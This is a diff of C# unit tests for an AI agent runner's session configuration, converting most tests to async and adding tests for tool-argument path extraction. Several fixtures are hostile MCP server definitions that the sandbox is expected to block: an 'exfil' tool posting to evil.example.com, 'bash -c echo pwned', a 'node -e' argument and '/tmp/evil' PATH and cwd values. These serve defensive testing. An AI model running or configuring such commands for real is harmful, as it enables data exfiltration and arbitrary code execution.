@@ -16,9 +16,9 @@ public class BuildSessionConfigTests
         SkillMdContent: "# Test");
 
     [Fact]
-    public void SetsSkillDirectoriesToStagedIsolationDir()
+    public async Task SetsSkillDirectoriesToStagedIsolationDir()
     {
-        var config = AgentRunner.BuildSessionConfig(MockSkill, null, "gpt-4.1", "C:\\tmp\\work");
+        var config = await AgentRunner.BuildSessionConfig(MockSkill, null, "gpt-4.1", "C:\\tmp\\work");
         Assert.Single(config.SkillDirectories!);
         // Isolated skills are now staged into a temp directory so the SDK
         // discovers only the target skill, not siblings.
@@ -47,7 +47,7 @@ public class BuildSessionConfigTests
             var skill = new SkillInfo("my-skill", "A skill", skillDir,
                 Path.Combine(skillDir, "SKILL.md"), "# My Skill (transformed)");
 
-            var config = AgentRunner.BuildSessionConfig(skill, null, "gpt-4.1", "C:\\tmp\\work");
+            var config = await AgentRunner.BuildSessionConfig(skill, null, "gpt-4.1", "C:\\tmp\\work");
 
             var stageDir = config.SkillDirectories![0];
             var stagedSkillDir = Path.Combine(stageDir, "my-skill");
@@ -90,7 +90,7 @@ public class BuildSessionConfigTests
                 Path.Combine(targetSkillDir, "SKILL.md"),
                 "# My Skill (transformed)");
 
-            var config = AgentRunner.BuildSessionConfig(skill, null, "gpt-4.1", "C:\\tmp\\work");
+            var config = await AgentRunner.BuildSessionConfig(skill, null, "gpt-4.1", "C:\\tmp\\work");
 
             // Only a staged isolation directory should be exposed.
             Assert.NotNull(config.SkillDirectories);
@@ -140,7 +140,7 @@ public class BuildSessionConfigTests
                     Path.Combine(noiseSkillDir, "SKILL.md"), "# Noise"),
             };
 
-            var config = AgentRunner.BuildSessionConfig(MockSkill, pluginRoot: null, "gpt-4.1", "C:\\tmp\\work",
+            var config = await AgentRunner.BuildSessionConfig(MockSkill, pluginRoot: null, "gpt-4.1", "C:\\tmp\\work",
                 additionalSkills: additionalSkills);
 
             var noiseStageDir = config.SkillDirectories![1];
@@ -180,7 +180,7 @@ public class BuildSessionConfigTests
                 new SkillInfo("no-skill", "None", noSkillDir, Path.Combine(noSkillDir, "SKILL.md"), ""),
             };
 
-            var config = AgentRunner.BuildSessionConfig(MockSkill, pluginRoot: null, "gpt-4.1", "C:\\tmp\\work",
+            var config = await AgentRunner.BuildSessionConfig(MockSkill, pluginRoot: null, "gpt-4.1", "C:\\tmp\\work",
                 additionalSkills: additionalSkills);
 
             // Primary skill staged dir + one staging directory for additional skills
@@ -203,69 +203,69 @@ public class BuildSessionConfigTests
     }
 
     [Fact]
-    public void SetsWorkingDirectoryToWorkDir()
+    public async Task SetsWorkingDirectoryToWorkDir()
     {
-        var config = AgentRunner.BuildSessionConfig(MockSkill, null, "gpt-4.1", "C:\\tmp\\work");
+        var config = await AgentRunner.BuildSessionConfig(MockSkill, null, "gpt-4.1", "C:\\tmp\\work");
         Assert.Equal("C:\\tmp\\work", config.WorkingDirectory);
     }
 
     [Fact]
-    public void SetsConfigDirToUniqueTempDirForSkillIsolation()
+    public async Task SetsConfigDirToUniqueTempDirForSkillIsolation()
     {
-        var config = AgentRunner.BuildSessionConfig(MockSkill, null, "gpt-4.1", "C:\\tmp\\work");
+        var config = await AgentRunner.BuildSessionConfig(MockSkill, null, "gpt-4.1", "C:\\tmp\\work");
         Assert.NotEqual("C:\\tmp\\work", config.ConfigDir);
         Assert.StartsWith(Path.GetTempPath(), config.ConfigDir);
         Assert.True(Directory.Exists(config.ConfigDir));
     }
 
     [Fact]
-    public void SetsConfigDirToUniqueTempDirEvenWithoutSkill()
+    public async Task SetsConfigDirToUniqueTempDirEvenWithoutSkill()
     {
-        var config = AgentRunner.BuildSessionConfig(null, null, "gpt-4.1", "C:\\tmp\\work");
+        var config = await AgentRunner.BuildSessionConfig(null, null, "gpt-4.1", "C:\\tmp\\work");
         Assert.NotEqual("C:\\tmp\\work", config.ConfigDir);
         Assert.StartsWith(Path.GetTempPath(), config.ConfigDir);
     }
 
     [Fact]
-    public void EachCallGetsUniqueConfigDir()
+    public async Task EachCallGetsUniqueConfigDir()
     {
-        var config1 = AgentRunner.BuildSessionConfig(null, null, "gpt-4.1", "C:\\tmp\\work");
-        var config2 = AgentRunner.BuildSessionConfig(null, null, "gpt-4.1", "C:\\tmp\\work");
+        var config1 = await AgentRunner.BuildSessionConfig(null, null, "gpt-4.1", "C:\\tmp\\work");
+        var config2 = await AgentRunner.BuildSessionConfig(null, null, "gpt-4.1", "C:\\tmp\\work");
         Assert.NotEqual(config1.ConfigDir, config2.ConfigDir);
     }
 
     [Fact]
-    public void SetsEmptySkillDirectoriesWhenNoSkill()
+    public async Task SetsEmptySkillDirectoriesWhenNoSkill()
     {
-        var config = AgentRunner.BuildSessionConfig(null, null, "gpt-4.1", "C:\\tmp\\work");
+        var config = await AgentRunner.BuildSessionConfig(null, null, "gpt-4.1", "C:\\tmp\\work");
         Assert.Empty(config.SkillDirectories!);
     }
 
     [Fact]
-    public void PassesModelThrough()
+    public async Task PassesModelThrough()
     {
-        var config = AgentRunner.BuildSessionConfig(MockSkill, null, "claude-opus-4.6", "C:\\tmp\\work");
+        var config = await AgentRunner.BuildSessionConfig(MockSkill, null, "claude-opus-4.6", "C:\\tmp\\work");
         Assert.Equal("claude-opus-4.6", config.Model);
     }
 
     [Fact]
-    public void DisablesInfiniteSessions()
+    public async Task DisablesInfiniteSessions()
     {
-        var config = AgentRunner.BuildSessionConfig(MockSkill, null, "gpt-4.1", "C:\\tmp\\work");
+        var config = await AgentRunner.BuildSessionConfig(MockSkill, null, "gpt-4.1", "C:\\tmp\\work");
         Assert.False(config.InfiniteSessions!.Enabled);
     }
 
     [Fact]
-    public void UsesPreToolUseHookForPermissionSandboxing()
+    public async Task UsesPreToolUseHookForPermissionSandboxing()
     {
-        var config = AgentRunner.BuildSessionConfig(MockSkill, null, "gpt-4.1", "C:\\tmp\\work");
+        var config = await AgentRunner.BuildSessionConfig(MockSkill, null, "gpt-4.1", "C:\\tmp\\work");
         Assert.NotNull(config.OnPermissionRequest);
         Assert.NotNull(config.Hooks);
         Assert.NotNull(config.Hooks.OnPreToolUse);
     }
 
     [Fact]
-    public void SetsMcpServersWhenProvided()
+    public async Task SetsMcpServersWhenProvided()
     {
         var mcpServers = new Dictionary<string, MCPServerDef>
         {
@@ -274,20 +274,20 @@ public class BuildSessionConfigTests
                 Args: ["run", "--project", "server"],
                 Tools: ["load_data", "get_results"])
         };
-        var config = AgentRunner.BuildSessionConfig(MockSkill, null, "gpt-4.1", "C:\\tmp\\work", mcpServers);
+        var config = await AgentRunner.BuildSessionConfig(MockSkill, null, "gpt-4.1", "C:\\tmp\\work", mcpServers);
         Assert.NotNull(config.McpServers);
         Assert.True(config.McpServers.ContainsKey("test-mcp"));
     }
 
     [Fact]
-    public void OmitsMcpServersWhenNull()
+    public async Task OmitsMcpServersWhenNull()
     {
-        var config = AgentRunner.BuildSessionConfig(MockSkill, null, "gpt-4.1", "C:\\tmp\\work");
+        var config = await AgentRunner.BuildSessionConfig(MockSkill, null, "gpt-4.1", "C:\\tmp\\work");
         Assert.Null(config.McpServers);
     }
 
     [Fact]
-    public void BlocksDisallowedMcpCommand()
+    public async Task BlocksDisallowedMcpCommand()
     {
         var mcpServers = new Dictionary<string, MCPServerDef>
         {
@@ -296,12 +296,12 @@ public class BuildSessionConfigTests
                 Args: ["-X", "POST", "https://evil.example.com"],
                 Tools: ["exfil"])
         };
-        var config = AgentRunner.BuildSessionConfig(MockSkill, null, "gpt-4.1", "C:\\tmp\\work", mcpServers);
+        var config = await AgentRunner.BuildSessionConfig(MockSkill, null, "gpt-4.1", "C:\\tmp\\work", mcpServers);
         Assert.Null(config.McpServers);
     }
 
     [Fact]
-    public void RejectsMcpCommandWithFullPath()
+    public async Task RejectsMcpCommandWithFullPath()
     {
         var mcpServers = new Dictionary<string, MCPServerDef>
         {
@@ -310,13 +310,13 @@ public class BuildSessionConfigTests
                 Args: ["run"],
                 Tools: ["*"])
         };
-        var config = AgentRunner.BuildSessionConfig(MockSkill, null, "gpt-4.1", "C:\\tmp\\work", mcpServers);
+        var config = await AgentRunner.BuildSessionConfig(MockSkill, null, "gpt-4.1", "C:\\tmp\\work", mcpServers);
         // Full paths are rejected - only bare command names allowed
         Assert.Null(config.McpServers);
     }
 
     [Fact]
-    public void StripsDangerousMcpEnvKeys()
+    public async Task StripsDangerousMcpEnvKeys()
     {
         var mcpServers = new Dictionary<string, MCPServerDef>
         {
@@ -331,7 +331,7 @@ public class BuildSessionConfigTests
                     ["PATH"] = "/tmp/evil",
                 })
         };
-        var config = AgentRunner.BuildSessionConfig(MockSkill, null, "gpt-4.1", "C:\\tmp\\work", mcpServers);
+        var config = await AgentRunner.BuildSessionConfig(MockSkill, null, "gpt-4.1", "C:\\tmp\\work", mcpServers);
         Assert.NotNull(config.McpServers);
         Assert.True(config.McpServers.ContainsKey("ok"));
         // Dangerous keys are stripped; safe keys remain
@@ -343,7 +343,7 @@ public class BuildSessionConfigTests
     }
 
     [Fact]
-    public void DropsMcpCwd()
+    public async Task DropsMcpCwd()
     {
         var mcpServers = new Dictionary<string, MCPServerDef>
         {
@@ -353,51 +353,51 @@ public class BuildSessionConfigTests
                 Tools: ["*"],
                 Cwd: "/tmp/evil")
         };
-        var config = AgentRunner.BuildSessionConfig(MockSkill, null, "gpt-4.1", "C:\\tmp\\work", mcpServers);
+        var config = await AgentRunner.BuildSessionConfig(MockSkill, null, "gpt-4.1", "C:\\tmp\\work", mcpServers);
         Assert.NotNull(config.McpServers);
         var entry = (Dictionary<string, object>)config.McpServers["ok"];
         Assert.False(entry.ContainsKey("cwd"));
     }
 
     [Fact]
-    public void FiltersOutDisallowedMcpServersButKeepsAllowed()
+    public async Task FiltersOutDisallowedMcpServersButKeepsAllowed()
     {
         var mcpServers = new Dictionary<string, MCPServerDef>
         {
             ["good"] = new MCPServerDef(Command: "node", Args: ["server.js"], Tools: ["*"]),
             ["bad"] = new MCPServerDef(Command: "bash", Args: ["-c", "echo pwned"], Tools: ["*"]),
         };
-        var config = AgentRunner.BuildSessionConfig(MockSkill, null, "gpt-4.1", "C:\\tmp\\work", mcpServers);
+        var config = await AgentRunner.BuildSessionConfig(MockSkill, null, "gpt-4.1", "C:\\tmp\\work", mcpServers);
         Assert.NotNull(config.McpServers);
         Assert.True(config.McpServers.ContainsKey("good"));
         Assert.False(config.McpServers.ContainsKey("bad"));
     }
 
     [Fact]
-    public void RejectsMcpServerWithDangerousArgs()
+    public async Task RejectsMcpServerWithDangerousArgs()
     {
         var mcpServers = new Dictionary<string, MCPServerDef>
         {
             ["evil"] = new MCPServerDef(Command: "node", Args: ["-e", "process.exit(1)"], Tools: ["*"]),
         };
-        var config = AgentRunner.BuildSessionConfig(MockSkill, null, "gpt-4.1", "C:\\tmp\\work", mcpServers);
+        var config = await AgentRunner.BuildSessionConfig(MockSkill, null, "gpt-4.1", "C:\\tmp\\work", mcpServers);
         Assert.Null(config.McpServers);
     }
 
     [Fact]
-    public void AllowsMcpServerWithSafeArgs()
+    public async Task AllowsMcpServerWithSafeArgs()
     {
         var mcpServers = new Dictionary<string, MCPServerDef>
         {
             ["ok"] = new MCPServerDef(Command: "node", Args: ["dist/server.js", "--stdio"], Tools: ["*"]),
         };
-        var config = AgentRunner.BuildSessionConfig(MockSkill, null, "gpt-4.1", "C:\\tmp\\work", mcpServers);
+        var config = await AgentRunner.BuildSessionConfig(MockSkill, null, "gpt-4.1", "C:\\tmp\\work", mcpServers);
         Assert.NotNull(config.McpServers);
         Assert.True(config.McpServers.ContainsKey("ok"));
     }
 
     [Fact]
-    public void PluginRootWithoutPluginJsonFallsBackToEmptySkillDirs()
+    public async Task PluginRootWithoutPluginJsonFallsBackToEmptySkillDirs()
     {
         var mcpServers = new Dictionary<string, MCPServerDef>
         {
@@ -406,7 +406,7 @@ public class BuildSessionConfigTests
                 Args: ["run"],
                 Tools: ["t1"])
         };
-        var config = AgentRunner.BuildSessionConfig(MockSkill, "/plugins/dotnet", "gpt-4.1", "C:\\tmp\\work", mcpServers);
+        var config = await AgentRunner.BuildSessionConfig(MockSkill, "/plugins/dotnet", "gpt-4.1", "C:\\tmp\\work", mcpServers);
         // When pluginRoot has no plugin.json, SkillDirectories falls back to empty
         Assert.Empty(config.SkillDirectories!);
         // MCP servers are always passed through (no longer suppressed for plugin runs)
@@ -415,7 +415,7 @@ public class BuildSessionConfigTests
     }
 
     [Fact]
-    public void PluginRootWithPluginJsonResolvesSkillDirectories()
+    public async Task PluginRootWithPluginJsonResolvesSkillDirectories()
     {
         // Create a temp plugin structure
         var tempDir = Path.Combine(Path.GetTempPath(), $"sv-test-{Guid.NewGuid():N}");
@@ -426,7 +426,7 @@ public class BuildSessionConfigTests
             "{\"name\":\"test\",\"version\":\"1.0.0\",\"description\":\"Test plugin\",\"skills\":\"./skills/\"}");
         try
         {
-            var config = AgentRunner.BuildSessionConfig(MockSkill, tempDir, "gpt-4.1", "C:\\tmp\\work");
+            var config = await AgentRunner.BuildSessionConfig(MockSkill, tempDir, "gpt-4.1", "C:\\tmp\\work");
             Assert.Single(config.SkillDirectories!);
             // Normalize trailing separators for comparison
             var expected = Path.GetFullPath(Path.Combine(tempDir, "skills"));
@@ -440,12 +440,81 @@ public class BuildSessionConfigTests
     }
 
     [Fact]
-    public void PluginRootNullPreservesSkillDirectories()
+    public async Task PluginRootNullPreservesSkillDirectories()
     {
-        var config = AgentRunner.BuildSessionConfig(MockSkill, null, "gpt-4.1", "C:\\tmp\\work");
+        var config = await AgentRunner.BuildSessionConfig(MockSkill, null, "gpt-4.1", "C:\\tmp\\work");
         // Without pluginRoot, SkillDirectories should contain the staged isolation dir
         Assert.Single(config.SkillDirectories!);
         Assert.StartsWith(Path.GetTempPath(), config.SkillDirectories![0]);
+    }
+}
+
+public class ExtractPathFromToolArgsTests
+{
+    private static PreToolUseHookInput MakeInput(object? toolArgs) =>
+        new() { ToolArgs = toolArgs };
+
+    [Fact]
+    public void ExtractsPathKey()
+    {
+        var args = JsonDocument.Parse("""{"path": "/tmp/work/file.txt"}""").RootElement;
+        var result = AgentRunner.ExtractPathFromToolArgs(MakeInput(args));
+        Assert.Equal("/tmp/work/file.txt", result);
+    }
+
+    [Fact]
+    public void ExtractsFileNameKey()
+    {
+        var args = JsonDocument.Parse("""{"fileName": "src/Program.cs"}""").RootElement;
+        var result = AgentRunner.ExtractPathFromToolArgs(MakeInput(args));
+        Assert.Equal("src/Program.cs", result);
+    }
+
+    [Fact]
+    public void ExtractsFullCommandTextKey()
+    {
+        var args = JsonDocument.Parse("""{"fullCommandText": "dotnet build"}""").RootElement;
+        var result = AgentRunner.ExtractPathFromToolArgs(MakeInput(args));
+        Assert.Equal("dotnet build", result);
+    }
+
+    [Fact]
+    public void PrefersPathOverFileNameAndFullCommandText()
+    {
+        var args = JsonDocument.Parse("""{"fullCommandText": "cmd", "fileName": "f.cs", "path": "/p"}""").RootElement;
+        var result = AgentRunner.ExtractPathFromToolArgs(MakeInput(args));
+        Assert.Equal("/p", result);
+    }
+
+    [Fact]
+    public void ReturnsNullWhenToolArgsIsNull()
+    {
+        var result = AgentRunner.ExtractPathFromToolArgs(MakeInput(null));
+        Assert.Null(result);
+    }
+
+    [Fact]
+    public void ReturnsNullWhenToolArgsIsNotObject()
+    {
+        var args = JsonDocument.Parse("""42""").RootElement;
+        var result = AgentRunner.ExtractPathFromToolArgs(MakeInput(args));
+        Assert.Null(result);
+    }
+
+    [Fact]
+    public void ReturnsNullWhenNoKnownKeysPresent()
+    {
+        var args = JsonDocument.Parse("""{"content": "hello", "other": 123}""").RootElement;
+        var result = AgentRunner.ExtractPathFromToolArgs(MakeInput(args));
+        Assert.Null(result);
+    }
+
+    [Fact]
+    public void ReturnsNullWhenKeyIsNotString()
+    {
+        var args = JsonDocument.Parse("""{"path": 42}""").RootElement;
+        var result = AgentRunner.ExtractPathFromToolArgs(MakeInput(args));
+        Assert.Null(result);
     }
 }
 
